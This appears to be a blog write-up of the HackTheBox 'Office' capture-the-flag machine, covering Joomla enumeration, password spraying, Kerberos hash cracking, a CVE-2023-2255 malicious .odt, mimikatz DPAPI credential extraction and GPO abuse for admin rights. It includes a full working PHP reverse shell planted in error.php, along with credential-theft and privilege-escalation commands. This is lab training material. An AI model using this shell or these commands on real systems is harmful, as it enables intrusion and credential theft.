@@ -1,0 +1,446 @@
+---
+layout: post
+title: "Office fb98949d426941feb525ffda5de0984e"
+date:   2025-07-10 12:05:57 -0400
+categories: writeups
+---
+
+# Office
+
+HackTheBox: Easy
+
+## 1: Enumeration
+
+- nmap scanning
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_1.png' | relative_url }})
+
+A lot of open ports let’s see what’s going on 80 port 
+
+There’s joomla service, so we proceed to use joomla scan to check versions and other interesting information
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_2.png' | relative_url }})
+
+On administrator there are a log in page, so we used an exploit looking for more information
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_3.png' | relative_url }})
+
+We’ve got some creds but in the administrator interface didn’t work, may be those credentials could be useful on another part of the system but first at all make a brute force attack to find users on smb
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_4.png' | relative_url }})
+
+Once we’ve found the users lists spray the password and that’s a good advance
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_5.png' | relative_url }})
+
+Get into smb client looking for shares
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_6.png' | relative_url }})
+
+There’s a .pcap file download it locally and use whireshark to analyse it.
+
+## 2: User flag
+
+We can intuitively search for kerberos packets
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_7.png' | relative_url }})
+
+We had a potential hash with the proper information 
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_8.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_9.png' | relative_url }})
+
+But before search on documentation we found the way to organize information found and the mode to crack it
+
+[https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_10.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_11.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_12.png' | relative_url }})
+
+Good, password found, as we saw before administrator is an user 
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_13.png' | relative_url }})
+
+We are close to get the user flag, but not to close, user error.php file to tamper it and make a php revshell
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_14.png' | relative_url }})
+
+```bash
+<?php
+// Copyright (c) 2020 Ivan Šincek
+// v2.6
+// Requires PHP v5.0.0 or greater.
+// Works on Linux OS, macOS, and Windows OS.
+// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
+class Shell {
+    private $addr  = null;
+    private $port  = null;
+    private $os    = null;
+    private $shell = null;
+    private $descriptorspec = array(
+        0 => array('pipe', 'r'), // shell can read from STDIN
+        1 => array('pipe', 'w'), // shell can write to STDOUT
+        2 => array('pipe', 'w')  // shell can write to STDERR
+    );
+    private $buffer = 1024;  // read/write buffer size
+    private $clen   = 0;     // command length
+    private $error  = false; // stream read/write error
+    private $sdump  = true;  // script's dump
+    public function __construct($addr, $port) {
+        $this->addr = $addr;
+        $this->port = $port;
+    }
+    private function detect() {
+        $detected = true;
+        $os = PHP_OS;
+        if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
+            $this->os    = 'LINUX';
+            $this->shell = '/bin/sh';
+        } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
+            $this->os    = 'WINDOWS';
+            $this->shell = 'cmd.exe';
+        } else {
+            $detected = false;
+            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
+        }
+        return $detected;
+    }
+    private function daemonize() {
+        $exit = false;
+        if (!function_exists('pcntl_fork')) {
+            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
+        } else if (($pid = @pcntl_fork()) < 0) {
+            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
+        } else if ($pid > 0) {
+            $exit = true;
+            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
+            // once daemonized, you will actually no longer see the script's dump
+        } else if (posix_setsid() < 0) {
+            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
+        } else {
+            echo "DAEMONIZE: Completed successfully!\n";
+        }
+        return $exit;
+    }
+    private function settings() {
+        @error_reporting(0);
+        @set_time_limit(0); // do not impose the script execution time limit
+        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
+    }
+    private function dump($data) {
+        if ($this->sdump) {
+            $data = str_replace('<', '&lt;', $data);
+            $data = str_replace('>', '&gt;', $data);
+            echo $data;
+        }
+    }
+    private function read($stream, $name, $buffer) {
+        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
+            $this->error = true;                            // set the global error flag
+            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
+        }
+        return $data;
+    }
+    private function write($stream, $name, $data) {
+        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
+            $this->error = true;                            // set the global error flag
+            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
+        }
+        return $bytes;
+    }
+    // read/write method for non-blocking streams
+    private function rw($input, $output, $iname, $oname) {
+        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
+            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
+            $this->dump($data); // script's dump
+        }
+    }
+    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
+    // we must read the exact byte length from a stream and not a single byte more
+    private function brw($input, $output, $iname, $oname) {
+        $size = fstat($input)['size'];
+        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
+            // for some reason Windows OS pipes STDIN into STDOUT
+            // we do not like that
+            // so we need to discard the data from the stream
+            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
+                $this->clen -= $bytes;
+                $size -= $bytes;
+            }
+        }
+        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
+            $size -= $bytes;
+            $this->dump($data); // script's dump
+        }
+    }
+    public function run() {
+        if ($this->detect() && !$this->daemonize()) {
+            $this->settings();
+
+            // ----- SOCKET BEGIN -----
+            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
+            if (!$socket) {
+                echo "SOC_ERROR: {$errno}: {$errstr}\n";
+            } else {
+                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS
+
+                // ----- SHELL BEGIN -----
+                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
+                if (!$process) {
+                    echo "PROC_ERROR: Cannot start the shell\n";
+                } else {
+                    foreach ($pipes as $pipe) {
+                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
+                    }
+
+                    // ----- WORK BEGIN -----
+                    $status = proc_get_status($process);
+                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
+                    do {
+                        $status = proc_get_status($process);
+                        if (feof($socket)) { // check for end-of-file on SOCKET
+                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
+                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
+                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
+                        }                                                                    // use proc_get_status() instead
+                        $streams = array(
+                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
+                            'write'  => null,
+                            'except' => null
+                        );
+                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
+                        if ($num_changed_streams === false) {
+                            echo "STRM_ERROR: stream_select() failed\n"; break;
+                        } else if ($num_changed_streams > 0) {
+                            if ($this->os === 'LINUX') {
+                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
+                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
+                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
+                            } else if ($this->os === 'WINDOWS') {
+                                // order is important
+                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
+                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
+                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
+                            }
+                        }
+                    } while (!$this->error);
+                    // ------ WORK END ------
+
+                    foreach ($pipes as $pipe) {
+                        fclose($pipe);
+                    }
+                    proc_close($process);
+                }
+                // ------ SHELL END ------
+
+                fclose($socket);
+            }
+            // ------ SOCKET END ------
+
+        }
+    }
+}
+echo '<pre>';
+// change the host address and/or port number as necessary
+$sh = new Shell('127.0.0.1', 9000);
+$sh->run();
+unset($sh);
+// garbage collector requires PHP v5.3.0 or greater
+// @gc_collect_cycles();
+echo '</pre>';
+?>
+```
+
+We trigger it calling the url
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_15.png' | relative_url }})
+
+We got into the system but without any permissions, we already know that tony is the administrator lets try to escalate privileges running a shell with his credentials
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_16.png' | relative_url }})
+
+We use RunasCs 
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_17.png' | relative_url }})
+
+Set the session
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_18.png' | relative_url }})
+
+```jsx
+.\RunasCs.exe user password payload
+```
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_19.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_20.png' | relative_url }})
+
+User got it!!
+
+## 3: Priv esc
+
+```jsx
+netstat -avn 
+```
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_21.png' | relative_url }})
+
+8083 Is sometimes used to host web services
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_22.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_23.png' | relative_url }})
+
+Go ahead to port forwarding
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_24.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_25.png' | relative_url }})
+
+We were right a web service with a section to upload documents 
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_26.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_27.png' | relative_url }})
+
+This interface allows user to upload .odt files and we know this can be vulnerable to 
+
+- (CVE-2023-2255)
+    
+    Improper access control in editor components of The Document Foundation LibreOffice allowed and attacker to craft a document that would cause external links to be loaded without prompt. In the affected versions of LibreOffice documents that used “floating frames” linked to external files, would load the contents of those frames without prompting the user for permission to do so. This was inconsistent with the tratment of other linked content in LibreOffice.
+    
+1. Create a evil .exe to call later exploiting the vulnerability
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_28.png' | relative_url }})
+
+1. Once you load the file on the victim machine create the evil .odt we also can make remote command execution.
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_29.png' | relative_url }})
+
+1. Set the session 
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_30.png' | relative_url }})
+
+1. Upload the maliciuous .odt files
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_31.png' | relative_url }})
+
+---
+
+That’s how we made successful lateral movement and we got a shell as ppots user
+
+```powershell
+#Command used to list all stored credentials 
+#or credentials that have been saved on the system
+#Target: The name or address of the resource of the saved creds
+#Type: Type of credentials
+#User: Users
+cmdkey /list
+```
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_32.png' | relative_url }})
+
+mimikatz a powerful post-explotation tool commonly used in penetration testing
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_33.png' | relative_url }})
+
+```powershell
+#/a:h list the hidden files
+#Route: It generally save user credentials and other auth info
+dir /a:h C:\Users\Ppots\AppData\Roaming\Microsoft\Credentials
+```
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_34.png' | relative_url }})
+
+```powershell
+#Extract and show protected stored credentials using (Data Protection API)
+dpapi:cred
+```
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_35.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_36.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_37.png' | relative_url }})
+
+```powershell
+#List secondary elements
+powershell Get-ChildItem
+```
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_38.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_39.png' | relative_url }})
+
+```powershell
+#This command is used to search and extract mastrer keys from DPAPI
+dpapi:masterkey /in"route" /rpc
+```
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_40.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_41.png' | relative_url }})
+
+Decrypt password
+
+```jsx
+#Left
+/unprotect /masterkey:<masterkey>
+```
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_42.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_43.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_44.png' | relative_url }})
+
+Successful lateral movement
+
+- We can download bloodhound files which can helps us with a final recognition process, this tool is used to identify and explore relationships inside a Active Directory environment
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_45.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_46.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_47.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_48.png' | relative_url }})
+
+Only numer Password neo4j
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_49.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_50.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_51.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_52.png' | relative_url }})
+
+We can see that HHOGAN is a member of managers so
+
+(As a member of the GPO Managers group, HHogan user May be granted permission to modify, create or link Group Policy objects, because the GPO Managers@office.htb group is a security group in AD and usually contains users with permissions to manage Group Policy objects (GPOs))
+
+```powershell
+#Used to retrieve all Group Policy Objets
+Get-GPO -All | Select-Object -ExpandProperty Displayname
+```
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_53.png' | relative_url }})
+
+```powershell
+.\SharpGPOAbuse.exe --AddlocalAdmin --UserAccount HHogan --GPOname "Default Domain Controllers Policy"
+gpupdate /force
+net localgroup administrators
+```
+
+![Untitled]({{ '/assets/images/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87/18b7611c-397a-4f48-bb63-bab237409ba9-export-a62fdf17-98e8-40b9-b484-7c20410bdd87_Untitled_54.png' | relative_url }})
+
+It is uploaded but if we want to make it valid on system we will need to exit the evil-winrm session and reopen it.
+
+Machine pwned!!!
